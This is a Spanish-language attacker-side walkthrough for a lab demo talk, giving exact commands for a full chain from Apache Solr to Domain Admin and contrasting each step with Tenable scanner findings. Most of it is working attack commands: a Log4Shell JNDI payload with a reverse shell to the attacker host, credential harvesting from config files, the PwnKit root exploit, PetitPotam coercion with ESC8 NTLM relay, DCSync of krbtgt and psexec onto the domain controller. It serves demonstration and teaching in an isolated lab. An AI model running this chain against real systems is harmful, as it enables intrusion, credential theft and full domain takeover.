# Bifrost — Guion de ataque (comando a comando)

Guía exclusiva del **lado atacante**: la lógica con la que un operador va
encontrando cada punto, los comandos exactos y qué decir en el escenario en cada
paso. Se lee de arriba a abajo, como sucede el ataque real.

> **Punto de partida.** El atacante (tu host ParrotOS) solo conoce una cosa: hay
> un servicio en `10.10.0.20:8983`. No tiene credenciales, no ve el dominio, no
> ve nada más. Tenable, en cambio, ya escaneó todo y tiene el reporte. La gracia
> de la charla es **contrastar ambos caminos** en cada salto.

---

## 0. Setup del atacante

```bash
source ~/bifrost/env.sh     # LHOST, TARGET_*, BIFROST_DOMAIN, credenciales y puertos
cd ~/bifrost
```

Variables que vas a usar (vienen de `config/lab.env`):

| Var | Valor | Qué es |
|---|---|---|
| `LHOST` | `10.10.0.66` | tu host (atacante) en VMnet1 |
| `TARGET_WEB` | `10.10.0.20` | web01 (Solr) |
| `TARGET_DC` | `10.10.0.30` | dc01 (AD + ADCS) |
| `TARGET_WS` | `10.10.0.31` | ws01 (Windows 10) |
| `BIFROST_DOMAIN` | `corp.local` | dominio |
| `BIFROST_SOLR_PORT` / `LDAP_PORT` / `HTTP_PORT` / `REVSHELL_PORT` | `8983` / `1389` / `8000` / `4444` | puertos |

---

## 1. Reconocimiento — encontrar el punto de entrada

**Lógica del atacante:** no sabes qué hay en la red; escaneas el único host que
tienes en el alcance y ves qué puerto contesta.

```bash
nmap -sV -p 8983 "$TARGET_WEB"
```

```
PORT     STATE SERVICE VERSION
8983/tcp open  http    Apache Solr
```

Ya con eso sabes que es Solr. Pregunta la versión:

```bash
curl -s "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/info/system?wt=json" | grep solr-spec-version
```

```json
"solr-spec-version":"8.11.0"
```

> **Speech:** *"No sabía nada de esta red. Escaneo el puerto, es Solr, y la
> versión me lo dice todo: 8.11.0 es vulnerable a Log4Shell."*

**Contraste con Nessus:** el scanner llegó al mismo sitio, pero **sin que nadie
le apuntara el puerto**: su barrido descubrió `8983` y el plugin de Log4Shell lo
marcó **Crítico (CVSS 10.0)** por la cabecera HTTP. Dos caminos, misma puerta.

---

## 2. Puente 1 — Log4Shell → shell

### Cómo lo encuentra el atacante

Versión `8.11.0` + Log4j2 ⇒ candidato a **CVE-2021-44228**. El atacante monta la
infraestructura JNDI y dispara la lookup contra un endpoint de Solr que loguea
parámetros.

### Comandos

**Terminal 1** — compila el payload y levanta el servidor LDAP + HTTP:

```bash
cd ~/bifrost/exploits/log4shell
./build.sh          # compila Exploit.class (reverse shell a $LHOST:4444)
./ldap-serve.sh     # HTTP:8000 sirviendo el .class + LDAP:1389 de marshalsec
```

**Terminal 2** — listener de la shell:

```bash
nc -lvnp "$BIFROST_REVSHELL_PORT"
```

**Terminal 3** — el disparo:

```bash
curl -g "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/cores?action=\${jndi:ldap://$LHOST:$BIFROST_LDAP_PORT/Exploit}"
```

> **Por qué `-g` (globoff):** sin esa bandera, `curl` interpreta `{` y `}` como
> globbing, los elimina de la URL y Log4j **nunca** ve la lookup `${jndi:...}`.
> Es el clásico "el exploit no funciona" que no es del exploit, es del `curl`.

La shell llega a la terminal 2. Estás como el usuario del servicio Solr:

```bash
id        # uid=... (solr)
hostname  # web01
```

> **Speech:** *"Un `curl`. Eso es el acceso inicial. El hallazgo crítico no era
> ruido: era una puerta."*

**Contraste con Nessus:** el plugin detectó la versión vulnerable **sin credenciales**,
por inspección de banner/HTTP. El atacante tuvo que compilar el payload, montar
LDAP y disparar — eso es lo que el escáner *no* hace: convertir un hallazgo en una
shell.

---

## 3. Puente 2 — Privesc: credenciales + PwnKit → root

### Cómo lo encuentra el atacante

Como `solr` (usuario de servicio, sin privilegios), el primer instinto es buscar
credenciales en archivos de configuración. La config del core de Solr las tiene.

### Comandos

```bash
cat /opt/solr/server/solr/intranet/conf/db.properties
```

```
db.user=svc_app
db.password=Bifrost2026!
```

Hay un usuario local `svc_app`. Cambias a él (es "más humano" que el usuario del
servicio, y reutiliza una password de una config):

```bash
su svc_app      # Bifrost2026!
```

Ya como `svc_app`, escalas con la CVE local. El exploit quedó **precompilado en
`/opt/pk`** durante la construcción (web01 no tiene internet en la demo):

```bash
cd /opt/pk && ./cve-2021-4034
id
```

```
uid=0(root) gid=0(root)
```

> **Speech:** *"Encontré una credencial en una config, salté a un usuario local y
> una CVE del sistema me hizo root. Fijaos en una cosa: este hallazgo no aparecía
> sin credenciales. Sin ellas el escáner ve la puerta; con ellas ve la casa."*

**Detalle técnico (importante para el ensayo):** PwnKit necesita `argc=0`. El
kernel de Ubuntu 20.04 **a partir de `5.4.0-124`** trae la mitigación
*"exec: force single empty string"* y el PoC falla (imprime el `usage` de
`pkexec`). `web01` debe arrancar con el kernel del release (`5.4.0-26`):

```bash
uname -r    # debe decir 5.4.0-26-generic
```

Si no precompilaste `/opt/pk` y la VM todavía tuviera red, el fallback es
`git clone https://github.com/berdav/CVE-2021-4034 /tmp/pk && cd /tmp/pk && make && ./cve-2021-4034`.

**Contraste con Nessus:** PwnKit (CVE-2021-4034) solo lo detecta el escaneo
**con credenciales** (checks locales de policykit). Es el argumento central del
"por qué escanear autenticado".

---

## 4. Puente 3 — Lateral: `svc_backup` → ws01

### Cómo lo encuentra el atacante

Root en `web01` = leer cualquier archivo del sistema. El deploy en `/opt/app`
tiene credenciales de dominio.

```bash
cat /opt/app/config.yml
```

```
domain:
  realm: CORP.LOCAL
  bind_user: svc_backup
  bind_password: "Verano2024!"
```

Vuelves a tu host y **validas** las credenciales contra `ws01`:

```bash
nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
```

`svc_backup` **no** es administrador de `ws01` (es un usuario de dominio normal),
así que no hay shell aquí: el valor del salto es confirmar que la credencial es
válida y leer el recurso compartido `Compartido` con sus señuelos:

```bash
smbclient "//$TARGET_WS/Compartido" -U "$BIFROST_SVC_USER%$BIFROST_SVC_PASS" -c 'ls'
```

> **Speech:** *"Root en una máquina no es el objetivo; el objetivo es el dominio.
> Y la cuenta de servicio de copias — `svc_backup` — viajaba en texto plano en un
> deploy. No me da una shell, pero es una credencial de dominio válida. Y una
> credencial de dominio es la llave del siguiente salto."*

Esa misma cuenta (`svc_backup`) es la que alimenta la coacción del puente 4.

**Contraste con Nessus:** aquí el reporte mostraba hallazgos "medios" dispersos —
SMB signing no requerido, recurso compartido con permisos amplios, una credencial
en un archivo. Ninguno crítico por separado. La cadena los une.

---

## 5. Puente 4 — ESC8 → Domain Admin

### Cómo lo encuentra el atacante

Ya eres un usuario de dominio (`svc_backup`). El objetivo es escalar a **Domain
Admin**. El DC tiene **ADCS con Web Enrollment sobre HTTP** (sin TLS, con NTLM):
eso es **ESC8** — puedes retransmitir la autenticación NTLM del propio DC para
obtener un certificado de `dc01$` y, con él, hacer DCSync.

### Comandos

**Terminal 1** — el relay que interceptará la autenticación (escucha en **445/tcp**;
`attacker-tools.sh` ya abrió ese puerto en ufw):

```bash
source ~/bifrost/env.sh
mkdir -p ~/bifrost/loot
ntlmrelayx.py -t "http://$TARGET_DC/certsrv/certfnsh.asp" \
  -smb2support --adcs --template DomainController -l ~/bifrost/loot
```

> En impacket 0.12 el loot se guarda con `-l` (no existe `--output-folder`).

**Terminal 2** — fuerzas al DC a autenticarse contra ti (coacción):

```bash
PetitPotam.py -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" -d "$BIFROST_DOMAIN" \
  "$LHOST" "$TARGET_DC"
```

La terminal 1 imprime y guarda el **PFX** de `dc01$`.

**Terminal 3** — el certificado se convierte en identidad (el PFX suele llamarse
`DC01$.pfx`):

```bash
certipy auth -pfx ~/bifrost/loot/DC01\$.pfx -dc-ip "$TARGET_DC"
```

Anota el hash NTLM de `DC01$` y haz DCSync:

```bash
secretsdump.py -just-dc-user krbtgt "$BIFROST_DOMAIN/DC01\$"@"$TARGET_DC" -hashes :<HASH>
```

El hash de `krbtgt` en pantalla es el clímax. Cierra con una shell de administrador:

```bash
psexec.py -k -no-pass "$BIFROST_DOMAIN/Administrator@$TARGET_DC"
dir C:\Corp\Finanzas
```

> **Speech:** *"Ninguna de las piezas de ESC8 es un 10.0: HTTP en vez de HTTPS,
> NTLM en vez de Kerberos, una plantilla que las máquinas pueden inscribir, una
> coacción de autenticación. Juntas son el dominio entero."*

**Contraste con Nessus:** si tu feed trae el plugin de ADCS, aparece como
configuración insegura; si no, **Attack Path Analysis** de Tenable One predijo
exactamente esta ruta: `svc_backup → ADCS → DC01$ → Domain Admin`. Aquí el
operador la recorre y demuestra que la predicción era correcta.

---

## 6. Impacto controlado

```bash
# dentro de la shell en dc01
type C:\Corp\Finanzas\Q4_Forecast_2026.txt
```

Lee una línea y **para**. Nada de cifrar, borrar ni exfiltrar.

> **Speech:** *"El impacto se demuestra leyendo un archivo. No hace falta nada
> más, y no vamos a hacerlo."*

---

## 7. Timeline del speech (30 min)

| Min | Momento | Frase clave |
|---|---|---|
| 00:00 | Hook | *"¿Cuál de los 47 críticos me da el dominio?"* |
| 03:00 | El qué (Tenable) | *"el producto dice que la ruta existe"* |
| 08:00 | Puente 1 | *"un `curl`"* |
| 12:00 | Puente 2 | *"sin credenciales veo la puerta; con ellas, la casa"* |
| 15:00 | Puente 3 | *"la credencial viajaba en texto plano"* |
| 19:00 | Puente 4 | *"ninguna pieza es un 10.0; juntas son el dominio"* |
| 24:00 | Impacto | *"se demuestra leyendo"* |
| 26:00 | Blue team | *"cada puente dejó su firma en los logs"* |

---

## Anexo — atajos por si te quedas en blanco

```bash
source ~/bifrost/env.sh                       # recargar variables
cd ~/bifrost/exploits/log4shell && ./selftest.sh   # ¿el puente 1 sigue vivo?
uname -r                                      # kernel correcto para PwnKit
ls ~/bifrost/loot/                            # ¿el PFX de ESC8 (DC01$.pfx) existe?
```

**Frase comodín** (ensáyala):

> *"Esto es exactamente lo que pasa en producción: el exploit no siempre funciona
> a la primera. Se cambia de técnica y se sigue."*
